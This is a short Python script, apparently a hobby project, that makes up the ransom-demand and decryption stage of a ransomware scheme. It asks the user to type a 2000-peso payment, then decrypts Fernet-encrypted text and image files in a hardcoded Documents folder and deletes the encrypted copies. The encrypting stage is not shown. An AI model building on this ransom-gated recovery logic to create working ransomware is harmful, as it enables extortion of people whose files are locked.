from cryptography.fernet import Fernet
import os


def load_key(key_file='key.key'):
    with open(key_file, 'rb') as f:
        key = f.read()
    return key


def decrypt_file(encrypted_file_path, output_dir, key, original_name):
    cipher_suite = Fernet(key)
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    decrypted_file_path = os.path.join(output_dir, original_name)
    with open(decrypted_file_path, 'wb') as f:
        f.write(decrypted_data)

def verify_payment(payment_amount):
    
    user_payment = float(input("Pay 2000 pesos before retriving all the file: "))
    if user_payment >= payment_amount:
        return True
    else:
        return False

def main():
    
    payment_amount = 2000  

    
    if not verify_payment(payment_amount):
        print(f"Payment of {payment_amount} pesos required for decryption.")
        return

    
    base_dir = 'C:/Users/alber/Documents/pajenago/'
    docs_dir = os.path.join(base_dir, 'docs')
    images_dir = base_dir


    if not os.path.exists(docs_dir):
        print(f"Directory {docs_dir} does not exist.")
        return

    
    key = load_key()

    
    for file_name in os.listdir(docs_dir):
        if file_name.endswith('_encrypted.txt'):
            encrypted_file_path = os.path.join(docs_dir, file_name)
            original_name = file_name.replace('_encrypted.txt', '.txt')
            decrypt_file(encrypted_file_path, docs_dir, key, original_name)
            os.remove(encrypted_file_path)

    
    for file_name in os.listdir(images_dir):
        if file_name.endswith('_encrypted.jpg'):
            encrypted_file_path = os.path.join(images_dir, file_name)
            original_name = file_name.replace('_encrypted.jpg', '.jpg')
            decrypt_file(encrypted_file_path, images_dir, key, original_name)
            os.remove(encrypted_file_path)

if __name__ == "__main__":
    main()
